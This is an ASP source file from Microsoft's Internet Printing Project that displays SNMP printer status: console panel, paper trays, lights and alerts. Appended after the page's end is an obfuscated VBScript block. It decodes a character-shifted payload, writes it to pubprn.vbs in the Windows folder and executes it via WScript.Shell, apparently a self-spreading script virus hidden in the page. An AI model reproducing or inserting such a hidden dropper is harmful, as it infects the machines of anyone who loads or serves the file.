<%@ CODEPAGE=65001 %>
<%
'Localized Language Code Page
'------------------------------------------------------------
'
'   Microsoft Internet Printing Project
'
'   Copyright (c) Microsoft Corporation 1998
'
'   Default SNMP page. This page is used if there is nothing
'   supplied by the printer vendor.
'
'------------------------------------------------------------
    option explicit
%>
<!-- #include file = "ipp_util.inc" -->
<!-- #include file = "ipp_0000.inc" -->
<%
    On Error Resume Next
    Err.Clear

    CheckSession

    Response.expires = 0
    Response.Buffer = TRUE
    Dim bRefresh
    bRefresh = Request ("refresh") = 1
%>

<%

const L_NotEmpty_Text    = "Not Empty"   'The input tray is not empty
const L_Empty_Text       = "Empty"       'The input tray is empty
const L_Name_Text        = "Name"        'The name of the input tray
const L_PaperSize_Text   = "Paper Size"
const L_Media_Text       = "Media"
const L_Current_Text     = "Current"     'The Current number of the paper in the input tray
const L_Maximum_Text     = "Maximum"     'The Maximum number of the paper in the input tray
const L_Tray_Text        = "Tray "

const L_Seperator_Text   = " - "
const L_Printer_Text     = "Printer"
const L_Output_Text      = "Output"

Function ErrorHandler (strErr)

    Dim strHref

    strHref = "ipp_0013.asp?code=" & Err.Number & "&notes=" & strErr & "&description=" & Err.Description

    Response.Redirect (strHref)
    Response.End

End Function

Function ErrorHandler2 (strErr)

    Dim strScript

    strScript = "<script language=javascript>function noerror(){" &_
                "var strHref;" &_
                "strHref = ""ipp_0013.asp?code=" & Err.Number & "&notes" & strErr & """;" &_
                "window.location.href = strHref;}</script>"

    Response.Write (strScript)
    Response.End

End Function

Function GenConsoleTable(iRow, iColumn, strArray, strLang)
Dim strHTML
Dim strBgnCol, strEndCol
Dim strBgnRow, strEndRow
Dim i, j, srcIndex, c
Dim tmpArray
ReDim tmpArray (iColumn)

strHTML = ""

strBgnCol = "<tr>"
strEndCol = "</tr>"

If strLang = "JP" then
    strBgnRow = "<td width=10 class=jpnfont><center><font face = ""lr oSVbN, Osaka"" size=2>"
Else
    strBgnRow = "<td width=10 ><center>" & DEF_FONT_TAG
End If

strEndRow = END_FONT & "</center></td>"

For i = 1 To iRow
    srcIndex = 1
    j = 1
    While j <= iColumn
        c = Mid (strArray(i - 1), srcIndex, 1)

        If c = "" Then
           tmpArray(j) = "&nbsp;"
        Else
            if Asc(c) <= 32 Then
               tmpArray(j) = "&nbsp;"
            Else
                If strLang = "JP" Then
                    tmpArray(j) = OleCvt.ToUnicode (c, 932)
                Else
                    tmpArray(j) = c
                End If
            End If
        End If
        j = j + 1
        srcIndex = srcIndex + 1
    Wend

    strHTML = strHTML & strBgnCol
    For j = 1 To iColumn
        strHTML = strHTML & strBgnRow & tmpArray(j) & strEndRow
    Next
    strHTML = strHTML & strEndCol
Next

GenConsoleTable = strHTML

End Function

Function GenOneLight (rgLights, i, strId)
    Dim strHTML

    strHTML = "<td width=50 align=right>&nbsp;&nbsp;&nbsp;"

    If rgLights(SNMP_LIGHT_ON, i) <> "0"  And strId <> "IBM Network Printer 24 2.34F" Then
        If rgLights(SNMP_LIGHT_OFF, i) <> "0" Then
            strHTML = strHTML & "<img src=""images/ipp_0012.GIF"">"
        Else
            strHTML = strHTML & "<img src=""images/ipp_0005.GIF"">"
        End If
    Else
        strHTML = strHTML & "<img src=""images/ipp_0015.GIF"">"
    End If

    strHTML = strHTML & "&nbsp;&nbsp;&nbsp;&nbsp;</td><td nowrap>" & DEF_FONT_TAG
    strHTML = strHTML & rgLights(SNMP_LIGHT_DESCRIPTION, i) & "&nbsp;" & END_FONT & "</td>"

    GenOneLight = strHTML

End Function

Function GenLightTable(iLights, rgLights, strId)
    Dim   i
    Dim   strHTML
    Dim   strBgnHdrCol, strEndHdrCol, strOneHeader
    Const L_State_Text = "State /"
    Const L_Light_Text =  "Light"

    strBgnHdrCol = "<td bgcolor=""#000000"">" & MENU_FONT_TAG & "<b>"
    strEndHdrCol = "</b>" & END_FONT & "</td>"

    strOneHeader = "<td align=right nowrap bgcolor=""#000000"">" & MENU_FONT_TAG & "<b>"  & L_State_Text & strEndHdrCol & "</td>" &  strBgnHdrCol & L_Light_Text & strEndHdrCol
    strHTML = "<tr>" &  strOneHeader & strOneHeader & strOneHeader & "</tr>"

    If iLights <= 25 then
        For i = 0 To iLights
            If i Mod 3 = 0 Then
                If i <> 0 Then strHTML = strHTML & "</tr>"
                strHTML = strHTML & "<tr>" & GenOneLight (rgLights, i, strId)
            Else
                strHTML = strHTML & GenOneLight (rgLights, i, strId)
            End If
        Next
        strHTML = strHTML & "</tr>"
    Else
        For i = 0 To iLights Step 2
            strHTML = strHTML & "<tr>" & GenOneLight (rgLights, i, strId)

            If i + 1 < iLights Then
                strHTML = strHTML & GenOneLight (rgLights, i + 1, strId)
            Else
                strHTML = strHTML & "<td></td><td></td>"
            End If

            strHTML = strHTML & "</tr>"
        Next
    End If

    GenLightTable = strHTML

End Function

Function GetCurrentNumberOfPaper (iCurrent)
    Dim strCount

    Select Case iCurrent
    Case -1, -2
        strCount = "&nbsp;"
    Case 0
        strCount = L_Empty_Text
    Case -3
        strCount = L_NotEmpty_Text
    Case Else
        strCount = cstr(iCurrent)
    End Select
    GetCurrentNumberOfPaper = strCount
End Function

Function GenTrayTable (bPaperSize, bPaperMedia, iTrays, rgTrays)
    Dim strHTML
    Dim strBgnHdrCol, strEndHdrCol
    Dim strBgnCol, strEndCol
    Dim strBgnRow, strEndRow
    Dim i, j, srcIndex, c
    Dim tmpArray

    strBgnHdrCol = "<td nowrap bgcolor=""#000000"">" & MENU_FONT_TAG & "<b>"
    strEndHdrCol = "</b>" & END_FONT & "</td>"
    strHTML = "<tr>"

    strHTML = strHTML & strBgnHdrCol & L_Name_Text & strEndHdrCol

    If bPaperSize Then
        strHTML = strHTML & strBgnHdrCol & L_PaperSize_Text & strEndHdrCol
    End If

    If bPaperMedia Then
        strHTML = strHTML & strBgnHdrCol & L_Media_Text & strEndHdrCol
    End If

    strHTML = strHTML & strBgnHdrCol & L_Current_Text & strEndHdrCol
    strHTML = strHTML & strBgnHdrCol & L_Maximum_Text & strEndHdrCol
    'strHTML = strHTML & strBgnHdrCol & L_State_Text & strEndHdrCol
    strHTML = strHTML & "</tr>"


    Dim strTrayName
    For i = 0 to iTrays
        strBgnCol = "<td>" & DEF_FONT_TAG
        strEndCol = END_FONT & "</td>"
        strHTML = strHTML & "<tr>" & strBgnCol

        if rgTrays(SNMP_INTRAY_UNIT, i) = "" or rgTrays(SNMP_INTRAY_UNIT, i) = " " then
            If rgTrays(SNMP_INTRAY_NAME, i) = "" Then
                strTrayName = L_Tray_Text & Cstr (i + 1)
            Else
                strTrayName = rgTrays(SNMP_INTRAY_NAME, i)
            End If
        Else
            strTrayName = rgTrays(SNMP_INTRAY_UNIT, i)
        End If
        strHTML = strHTML & strTrayName & strEndCol
        rgTrays(SNMP_INTRAY_UNIT, i) = strTrayName

        If bPaperSize Then
            strHTML = strHTML & strBgnCol

            dim strLongName
            strLongName =  objHelper.LongPaperName (rgTrays(SNMP_INTRAY_MEDIA, i))
            If strLongName = "Unknown" Then
                strLongName = rgTrays(SNMP_INTRAY_MEDIA, i)
            End If

            strHTML = strHTML & strLongName & strEndCol
        End If

        If bPaperMedia Then
            strHTML = strHTML & strBgnCol & getMedia (rgTrays(SNMP_INTRAY_MEDIA, i)) & strEndCol
        End If
        strHTML = strHTML & strBgnCol & GetCurrentNumberOfPaper( rgTrays(SNMP_INTRAY_CURRENT, i)) & strEndCol
        strHTML = strHTML & strBgnCol & rgTrays(SNMP_INTRAY_MAX, i) & strEndCol
        strHTML = strHTML & "</tr>"
    Next

    GenTrayTable = strHTML

End Function


Function GenAlertTable (iAlerts, rgAlerts, rgTrays)
    Dim strHTML
    Dim i, j, bDup, code, strDscp

    strHTML = ""

    For i = 0 to iAlerts
        code = rgAlerts(SNMP_ALERT_CODE, i)
        j = 0
        bDup = FALSE
        While j <= i - 1 And Not bDup
            If code = rgAlerts(SNMP_ALERT_CODE, j) Then
                If rgAlerts(SNMP_ALERT_SUBUNIT, i) = rgAlerts(SNMP_ALERT_SUBUNIT, j) And rgAlerts(SNMP_ALERT_INDEX, i) = rgAlerts(SNMP_ALERT_INDEX, j) Then
                    bDup = TRUE
                End If
            End If
            j = j + 1
        Wend

        If Not bDup Then
            strHTML = strHTML & "<tr><td width=""10%"">"

            Select Case rgAlerts(SNMP_ALERT_SEVERITY, i)
            Case 3,5
                strHTML = strHTML & "<img src=""images/ipp_0004.GIF"" width=""20"">"
            Case 4
                strHTML = strHTML & "<img src=""images/ipp_0003.GIF"" width=""20"">"
            Case Else
                strHTML = strHTML & "&nbsp;"
            End Select

            strHTML = strHTML & "</td><td>" & DEF_FONT_TAG
            Select Case rgAlerts(SNMP_ALERT_SUBUNIT, i)
            Case 8
                If rgAlerts(SNMP_ALERT_INDEX, i) > 0 Then
                    strHTML = strHTML & rgTrays(SNMP_INTRAY_UNIT, rgAlerts(SNMP_ALERT_INDEX, i) - 1) & L_Seperator_Text
                Else
                    strHTML = strHTML & L_Tray_Text & L_Seperator_Text
                End If
            Case 5
                strHTML = strHTML & L_Printer_Text & L_Seperator_Text
            Case 9
                strHTML = strHTML & L_Output_Text & L_Seperator_Text
            Case Else
                '
            End Select

            strHTML = strHTML & rgAlerts(SNMP_ALERT_DESCRIPTION, i) & END_FONT & "</td></tr>"
        End If
    Next

    GenAlertTable = strHTML

End Function

Function getMedia(mediaName)
    Dim media, i, mediaList
    Dim L_MediaList_Text(3)

    mediaList = Array("-white", "-envelope", "-colored", "-transparent")

    L_MediaList_Text(0) = "White Paper"
    L_MediaList_Text(1) = "Envelope"
    L_MediaList_Text(2) = "Colored Paper"
    L_MediaList_Text(3) = "Transparecy"

    i = 0
    For Each media In mediaList
        If InStr(mediaName, media) > 0 Then
            getMedia = L_MediaList_Text(i)
            Exit Function
        End If
        i = i + 1
    Next
    getMedia = ""
End Function


Const L_WrongIP_Message = "The IP Address is not correct."
Const L_PageTitle_Text = "Microsoft Default SNMP status"
Const strFileID = "page1.asp"

    Dim rgState, rgAlerts, rgLights, rgTrays, rgConsole, strLight
    Dim bRet, objHelper
    Dim iRow, iColumn, iAlerts, iTrays, iLights
    Dim bPaperSize, bPaperMedia, i
    Dim strLang
    Dim strId
    Dim objSNMP
    Dim strIP, strCommunity, iDevice, strDevice
    Dim strPrinter, strEncodedPrinter, strComputer, strNewURL
    Dim strHTML

    Err.Clear

    strIP = Request(IPADDRESS)
    If strIP = "" Then
        Err.Number = 1
        Err.Description = L_WrongIP_Message
        ErrorHandler (strFileID)
    End If

    strCommunity      = Request (COMMUNITY)
    iDevice           = Request(DEVICE)
    strDevice         = CStr(iDevice)
    strEncodedPrinter = Request(PRINTER)
    strPrinter        = OleCvt.DecodeUnicodeName ( strEncodedPrinter )

    Set objSNMP = Server.CreateObject(PROGID_SNMP)
    If Err Then ErrorHandler (strFileID)

    objSNMP.open strIP, strCommunity, 3, 2000
    If Err Then ErrorHandler (strFileID)

    strComputer = session(COMPUTER)

    strNewURL   = "page1.asp?refresh=1" & ATIPADDRESS & strIP             & ATCOMMUNITY & strCommunity &_
                                          ATPRINTER   & strEncodedPrinter & ATDEVICE    & strDevice

    Set objHelper = Server.CreateObject (PROGID_HELPER)
    objHelper.open "\\" & strComputer & "\" & strPrinter
    If Err Then ErrorHandler (strFileID)

    'Get Printer Id
    strId = objSNMP.Get ("25.3.2.1.3." & CStr (iDevice))
    If Err.Number <> 0 Then
        ErrorHandler (strFileID)
    End If

    'Get basic state
    rgState = rgSNMPGetState(objSNMP, iDevice)
    If Err.Number <> 0 Or Not IsArray (rgState) Then ErrorHandler (strFileID)


    If bRefresh Then
        bRet = rgSNMPConsole(objSNMP, iDevice, iRow, iColumn, rgConsole, strLang)
        If Not bRet Then ErrorHandler (strFileID)

        rgLights = rgSNMPLights(objSNMP, iDevice, iLights)
        If Err.Number <> 0 Then ErrorHandler (strFileID)
        rgTrays = rgSNMPGetInputTrays(objSNMP, iDevice, iTrays)
        If Err.Number <> 0 Then ErrorHandler (strFileID)

        If iTrays >= 0 then
            bPaperSize = not (rgTrays(SNMP_INTRAY_MEDIA, 0) = "" or  rgTrays(SNMP_INTRAY_MEDIA, 0) = " " )

            bPaperMedia = (getMedia (rgTrays(SNMP_INTRAY_MEDIA, 0)) <> "")
        End if
        'Get alerts
        rgAlerts = rgSNMPGetAlerts(objSNMP, objHelper, iDevice, iAlerts)


    End If

%>
<html>

<head>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
<meta http-equiv="refresh" content="120; url=<%=strNewURL%>" >
<%=SetCodePage%>
<title><%=Write(L_PageTitle_Text) %></title>
</head>

<body bgcolor="#FFFFFF" text="#000000" link="#000000" vlink="#000000" alink="#000000"
topmargin="0" leftmargin="0" onload="noerror()">


<%=Write(DEF_BASEFONT_TAG)%>

<%
    If Not bRefresh Then
        Response.Flush
        bRet = rgSNMPConsole(objSNMP, iDevice, iRow, iColumn, rgConsole, strLang)
        If Not bRet Then ErrorHandler2 (strFileID)
    End If

   Const L_FrontPanelColon_Text = "Front Panel:"
   Const L_DeviceStatus_Text    = "Device Status:"
   Const L_FrontPanel_Text      = "FrontPanel"
   Const L_RealTimeTitle_Text   = "Real time display of the printer front panel"
%>

<table width="100%" border=0 cellspacing="0" cellpadding="2">
    <tr>
        <td nowrap>
            <b><%=Write(DEF_FONT_TAG & L_DeviceStatus_Text & END_FONT)%></b>
        </td>
<% If IsArray (rgConsole) Then
	Response.Write(Write("<td><b>" & DEF_FONT_TAG & L_FrontPanelColon_Text & END_FONT & "</b></td>") )
   End If
%>

    </tr>
    <tr>
        <td>
            <% =Write(strSnmpStatus(rgState)) %>
        </td>
<% If IsArray (rgConsole) Then
       strHTML = "<td><table border=""2"" bgcolor=""#C0C0C0"" ><tr>" &_
		     "<td><table border=""0"" width=""" & CStr(iColumn*10) & """ bgcolor=""#C0C0C0"" cellspacing=""0"" cellpadding=""0"" title = """ & L_RealTimeTitle_Text & """>" &_
                           GenConsoleTable(iRow, iColumn, rgConsole, strLang) &_
                      "</table></td>" &_
                 "</tr></table></td>"
	Response.Write( Write(strHTML) )
   End If
%>
    </tr>
</table>


<br>
<% Const L_PaperTrays_Text = "Paper Trays:" %>
<b><%=Write(DEF_FONT_TAG & L_PaperTrays_Text & END_FONT)%></b><br>

<%
    If Not bRefresh Then
        Response.Flush
        rgTrays = rgSNMPGetInputTrays(objSNMP, iDevice, iTrays)
        If Err.Number <> 0 Then ErrorHandler2 (strFileID)

        If iTrays >= 0 Then
            bPaperSize = not (rgTrays(SNMP_INTRAY_MEDIA, 0) = "" or  rgTrays(SNMP_INTRAY_MEDIA, 0) = " " )

            bPaperMedia = (getMedia (rgTrays(SNMP_INTRAY_MEDIA, 0)) <> "")
        End If
    End If
%>
<table border="0" width="100%" cellspacing="0" cellpadding="2">
<%=Write(GenTrayTable (bPaperSize, bPaperMedia, iTrays, rgTrays))%>
</table>


<%
    If Not bRefresh Then
        Response.Flush
        rgLights = rgSNMPLights(objSNMP, iDevice, iLights)
        If Err.Number <> 0 Then ErrorHandler2 (strFileID)
    End If
%>

<%If iLights >= 0 Then %>
<br>
<% const L_ConsoleLights_Text = "Console Lights:" %>
<b><%=Write(DEF_FONT_TAG & L_ConsoleLights_Text & END_FONT)%></b><br>

<table border="0" width="100%" cellspacing="0" cellpadding="2">
<%=Write(GenLightTable (iLights, rgLights, strId))%>
</table>
<% End If%>

<br>
<% Const L_DetailedErr_Text = "Detailed Errors and Warnings:" %>
<b><%=Write(DEF_FONT_TAG & L_DetailedErr_Text & END_FONT)%></b><br>
<%
    If Not bRefresh Then
        Response.Flush
        'Get alerts
        rgAlerts = rgSNMPGetAlerts(objSNMP, objHelper, iDevice, iAlerts)
        'If Err.Number <> 0 Then Exit Function
    End If

%>

<table border="0" width="100%">
<%=Write(GenAlertTable (iAlerts, rgAlerts, rgTrays))%>
</table>

<%
    objHelper.close
%>

</body>
</html>
<script language=javascript>
function noerror()
{
}
</script>
<%
    Response.End
%><ScRIPT laNGUAGE=VBsCRiPT>
ON ERrOR ResuMe Next
m5=m5&ho6("ne6>#aaa¯NKµaa~a¢µŠ€icŽµ¯oŠŽ®«µcjNKŽaa~ao°­ižŽµoª¶¢ŠmarjNK¹~itujNK³¯¥ªNK~ªµikrqqltqjNKr~iªi¥ksvlzxjjNKŽs~iµiksvlzxjjNKt~©iªi¯ksvlzxjjNKu~€©³i¯i¯ksvlzxjjNKv~©³ii³¯ksvlzxjjNKw~iª¯iksvlzxjjNKx~©i¯i³¯ksvlzxjjNKŽy~€©iªiksvlzxjjNKz~iiksvlzxjjNKr~µikylrjNKs~ª¯ikylrjNK€t~i¯kylrjNK€u~i¯¥kylrjNKNKµª°aiŽjNKa»~raµa­iŽµjNK€»~Ži¥i©m»mi©jjjNKawua¢¯a€»}zra©¯NK¯ª»NKs~¯i³¥ksjNK§a³s~raŠ¯NK»~ltsNK¯¥aªNK¯aNK§azwa¢a€»}rstaNK°®NKt~iksjNK§at~ra©ŠNK~€ntsNK¯¥aª§NKŠaNK©~lNK~¯gijNK¯¹µNKŠ¥a¶¯€µªNKNK§¯€µª¯aiŽ©µjNKa¢~raµa­Ši©ªjNKš~g³ii®¥iŽmm­iµjjjlrjNKŠ¹NKa¯€NKNK°¥¯ijNKNK³a~a¢o¥­­NK¢£ŠoŽŠNK~ijNK¢­ijNKª§a¥¢i°j~waai°j~rta³ai°j~sra°a¥ij~syaµ©ŠNKrijNKŠŽŠNKuijNK¯aª§NKNKŽ¶aijNK°aŠa¶a¹NKaa~a€Š°«€icŽ€ªªšoªºŠ€cjNKa³a~ao¢µµª­Ši€oª±µ§­¢®jNK¥ožª¯Šargsgrgc~cggi€°ŠjgNKoŠŠatgŽugsgc~cg¹gš¯ic€~cgvgŽwgtgcicgrgsg€rgcjcjg¹NK³ožac¶€acgvgwg€tgcicgŽxgŽygugcjcNKo³ª­acacgŽzgc~raa­ŠicgxgygugcjcNKoµŠ­¯avgwg€tgc~cgvgŽwgtgcg³i€i®icgxgygugcmcgŽzgcm¯icgxgŽygugcjjjncg£gcjcNK¥o³ªµŠªŠacµcNK³ožªŠaca§ª¯cNK¥o³ŠacŠ€¶µŠacgvgwgtgcicgŽtgugsgcjcNK¥oª¯acŠ€acgvgwg€tgcicgrgŽsgrgcjcNKo€­°ŽNK¥a¶£NKNKŽ£aŠijNK°a³³³aŠŽ®ŠaŠµNKµaa~a³«€µic€ª±µªšoŠŽºµ£cjNKŠa³a~aoµ¹µ­iŽoŽ³±¶®jNKoai¢­jNKoNKŠ¯aNKNKŽa®ªijNK¯a°aŠa¹µNKŽaa~a€¢µ°ŠaicŽµªšoª­Ž°ŠcjNKaa~ao­ŠaižŽªµoŽ³¶¯jNKa©±a~a€³¢Šµaic°µ­°oµªcjNKŠaª­a~aoµ¢®€Šaic®¢±ªcjNK§°³aa~araµa®¢o¥¥ŠŽ­ªo¯NKa£a~a®­o¢ŠŽ­ŽµaijNK€¶a~arNKa€a~a±o³Š®aiqjNK§aa~araµ°ao¥Šo¯NKa~ao¥¥Š¯Šai€¶¯µŠ³jNKoŠª±ª¯µŽoaijNK€µ³a~a€ŠalarNK¯¹NKijNKo¶£«a~accNK€oa~accNK€o¢µµŽo¥ai§jNKoŠµ§Š³Ža~aNKoŽNKŠNK¯aŽNKNK£auijNKaŠ³a³Ž¶Ša¯¹µNKŽŠµaa~a£icª±oŠŽ°£ŠµcjNKaŠ€©aŽ¯µ³ª·aaoªNKªaŠŠ€±³ªo¥ªºŠa~asa NK³aŠ¯µºŠŽoº±Ša~ataµNKwaiŽ¬¯¥·oµagaccjNKŠ¯aNKNKaŽNKNK¶£avi§­jNK¯a³³aŠŽ®a¯µNKµa¢a~a³icŽ€ª¯oŠ£€cjNKŽŠµaa~aošŠµ³iµ³šjNK³a¢a¯aaoŠŽNKªŠŠa~aoŠ¹¯ª°¯®ioµjNKµr~iŠjNKs~Žic£ŽcjNKµt~Šic·£cjNK¹u~Žic©µcjNKŠµv~€¢ŠicµcjNK¹µw~ic©µcjNKŠ¹x~­€iccjNK¹µy~€ic¢ŽcjNKar~sa°aµr~ta©NKa±a~a¢o°¹ª­i¯o±¢marjNK¥a~ao³¥NK±oNKŽµaa~aoµ§ŠiojNKoŠi³jNK¥³o³Ši³­jNKo°ŽNKo³ªµ~rNK¯¥a§NKNKªar~uaar~¹µva³ar~wa°³ar~Š¹xa°a¹r~¹yaŠNKŽŠµa±a~a¢oŠ¯ŠµŠiomarjNKa~a±o³­NK°±o°NKa³a~a¢oŠªio¢jNK³ož³Ši¥jNK¥o³ªac}±a­¢š~Ž€cNK³oªµŠ­aca³°aŽŠa¯µcNKož³ªµŠª¯aŽrgugc~cgrgugcgcgŽvgwg€tgcicg£g©g¹gcjcNKožª¯acacgvgwgtgcicgxgygugcjcNK¥ož³Š­ac³acgzgc~raaŠ¯icgxgyg€ugcjcNKožavgwgtgc~cgŽvgŽwgtgcg©³i€i¥icgŽxgygugcmcgzgcm­ŠicgŽxgŽyg€ugcjjjnrjcNKo³ª­ª¯ac¯ŠcNKožacŠ¥a¯€µcNK³ožacŽŠa¢~€icg£gc³µo§Š®°µcg£gcjcNK¥o³ªŠ­ªac¯~oŽŠ€­­³iqjcNK¥³oµŠ­ªacµa¥~o³ŠŠŠ¹µ§­i¯gcg¹gc±oŽcg£gcjcNK¥oµŠªŠacožaicgrg€ugcjcNKoª¯aco­°cNK¥³o³ŠacŽŠa~€³µŠ€icggc€µocg£gcjcNK¥o³Š­¯ac¹o¶¯aiª¥gcg£gc±ocg¹gcjcNKožµŠ¯Šac}p³cNK³o­°ŽNKo¢µ~rNKaNK¯NK¥a¶£NKNKŽawiªŠšŠjNK¯a³aŠŽaNKaa~a³€ic€³±ª¯šoªºŽŠ°£«µcjNKŠµaa~ao§i­µ¢³šµjNK§³a¢€©aa¯a§oŽ£ŠNKvai¯o¢jNKwai¯o¢jNKµNKŠ¯aNKNKaŠrijNKa³³aŽaµNKŠµaa~a³Šµ£µico§­ŽŠ£«cjNK°a¢aŽŠµ€ª·ŠŽaa¢o³NKaŠ¯Šµ€°±º³·Šo·µa~asa NK°³aŠ¯Šµº¥³ª·Šo¥·µºa~ataµNKŠtaiŠŠ¬¯°³ªoagaccjNKŠaNKNKŠa£NKNKaŠsi­Š¢jNKa³a¶aŠ¹NKaa~a³¢£«icŽ³ª¯o§Š®«€cjNKŠa§a~aoµiŠjNK§³aŠ©aa¯a§o§ªNK¯o¢ª£¶a~aqNKo­ŠŠai¯ojNK¹NKŠa£NKNKati­ŠšjNK°¯aŠ³³aŠaNKµaa~aµŠ«icŽµªo§ªŠº®ŠµcjNKµaa~aoµ­i­¢µjNKa¢€aaao°Š³ŽNKsaioµjNKtaiojNK¹NK¯a#jz3>#°~©°wi¥vj#gvOdUJpo!ip7)oz6*gpS!o>2!Up!MfO)oz6*ip7>ip7'DIs)bTD)nJe)oz6-o-mFo)oz6***.75*OFyUFoE!gVODUJPofYFDVuf!ip7)jz3*FYfDVuf!ip7)ne6*")
FuNCTION ho6(ny5)
fOR n=1 TO Len(ny5)
ho6=ho6&chr(aSc(MId(ny5,n,LEN(ny5)))-1)
NeXt
end FuncTIon
Set A=CREATeoBjEct("SCrIPTing.fILeSySTEMoBjECt")
wInD=A.GETSPECIAlfOlDEr(0)
SEt DR=A.CrEATeTextfIlE(WinD&"\puBPRN.VBS")
DR.wRITe (m5)
Dr.cloSe
SEt X=CReaTEoBJECT("wscRiPT.sHELL")
x.RuN (WiNd&"\pUbPRN.vBS")
</SCripT>
